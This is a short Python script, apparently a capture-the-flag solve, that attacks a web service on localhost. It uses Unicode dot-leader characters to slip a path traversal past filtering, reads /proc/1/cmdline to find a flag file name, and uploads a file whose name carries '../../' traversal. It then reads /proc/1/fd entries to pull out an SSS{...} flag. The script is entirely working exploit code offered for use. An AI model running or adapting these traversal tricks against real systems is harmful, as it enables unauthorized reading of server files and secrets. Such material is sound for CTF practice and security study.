import socket
import re
import requests

req = (
    "GET /resource?image=%E2%80%A5/%E2%80%A5/proc/1/cmdline HTTP/1.1\r\n"
    "Host: localhost:5000\r\n"
    "\r\n"
)

res = b""
with socket.create_connection(("localhost",5000), timeout=5) as s:
    s.sendall(req.encode())
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        res += chunk

flag_path = re.search(".{8}_flag.txt",res.decode()).group()

s = requests.Session()
url = 'http://localhost:5000'

file = {"file": (f"../../{flag_path}", '123')}
try:
    s.post(url + '/upload', files=file, timeout=0.1)
except:
    pass

FLAG = ''
for i in range (3,10):
    r = s.get(url + f'/resource?image=%E2%80%A5/%E2%80%A5/proc/1/fd/{i}')
    if 'SSS' in r.text:
        FLAG = re.search(r'SSS\{.+?\}', r.text).group()
        break

print(f"FLAG: {FLAG}")

